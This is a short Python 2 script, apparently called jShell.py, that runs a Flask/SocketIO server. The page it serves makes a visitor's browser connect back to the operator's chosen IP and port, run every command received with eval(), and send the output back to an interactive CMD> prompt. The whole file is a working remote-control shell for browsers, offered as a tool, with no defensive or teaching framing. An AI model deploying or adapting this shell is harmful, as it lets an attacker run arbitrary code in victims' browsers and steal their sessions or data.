from flask_socketio import SocketIO,emit
from flask import Flask, render_template, session,request,flash,redirect,url_for
import sys

if len(sys.argv)<3:
    print "Usage : python jShell.py IpAddress Port\nExample: python jsHell.py 192.168.0.1 8080"
    exit()

PORT=sys.argv[2].strip()
HOST=sys.argv[1].strip()

print "Listening on",HOST+":"+PORT

app = Flask(__name__)
app.secret_key='I Am Batman.'
access_key="Tony Stark Is The Best."
session_id="This guy fucks!"
socketio = SocketIO(app)

html='''
<div id=history></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js"></script>

<script>
'''    
html=html+"var socket = io.connect('http://{}:{}');".format(HOST,PORT)

html=html+'''
    try{setTimeout(`
            socket.emit('sendMSG','Connection Established.')
        `,1000)
     }

    catch{}

    socket.on('getMSG',function(data){
        document.getElementById("history").innerHTML+="<br><font size=3 color=black> ["+data+"]</font>";
        try{
             output=eval(data)+""
        }
        catch(e){
            output=e+""
        }
        socket.emit('sendMSG',output)
    })
</script>
'''

@app.route('/',methods = ['GET'])
def shell():
    return html

@socketio.on('sendMSG')
def sendMSG(message): #Get MSG from Client
    print("OUTPUT> "+str(message))
    command=raw_input("CMD> ")
    emit("getMSG",command+"\n")
    if command=="exit":
        exit()

if __name__ == '__main__':
   socketio.run(app,debug=True,host=HOST,port=int(PORT))

